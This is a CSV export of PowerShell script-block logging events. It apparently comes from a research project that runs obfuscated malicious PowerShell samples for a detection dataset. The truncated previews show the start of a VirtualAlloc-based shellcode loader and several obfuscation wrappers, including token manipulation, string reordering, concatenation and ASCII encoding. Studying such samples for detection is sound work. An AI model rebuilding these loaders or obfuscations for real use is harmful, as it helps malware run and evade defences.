"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 10:35:35 AM","","6","prompt"
"8/6/2026 10:35:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:35:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:35:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:35:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:35:27 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\183.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:35:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:35:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:35:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:35:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:35:19 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:35:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\183.ps1","2753","&( $PShoMe[21]+$PsHomE[30]+'X')( ((""{5}{39}{1}{29}{40}{27}{13}{14}{45}{7}{37}{32}{41}{15}{12}{38}{2}{24}{30}{22}{16}{33}{10}{36}{23}{20}{44}{43}{17}{28}{34}{9}{8}{4}{6}{35}{25}{3}{42}{11}{26}{18}{19}{"
"8/6/2026 10:35:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:35:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:35:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:35:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:35:12 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:35:11 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\183.ps1","2682","& ( ([STRiNg]$VeRBoSeprefEreNCe)[1,3]+'X'-Join'') ((('8ltc = JVW[DllImport(Tbx'+'kernel32.dllTbx)]public static extern IntPtr VirtualAlloc(IntPtr lpAd'+'dress, uint dwSize, uint flAllocationType, uint"
"8/6/2026 10:35:04 AM","","2234"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/6/2026 10:35:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\183.ps1","20","{ ( [CHaR] [int]$_)}"
"8/6/2026 10:35:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\183.ps1","7729"," ""$(set-vaRIAble  'ofS' '' ) ""+ [STRIng]('36k99;32:61:32-39S91O68X108>108>73W109_112;111W114X116X40>34W107>101;114W110W101O108;51O50X46X100X108k108:34S41>93:112S117X98>108_105;99-32;115S116k97:116_105"
"8/6/2026 10:34:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:55 AM","C:\TA\project-ta\data_spliting\test_set\malicious\183.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:47 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1827.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
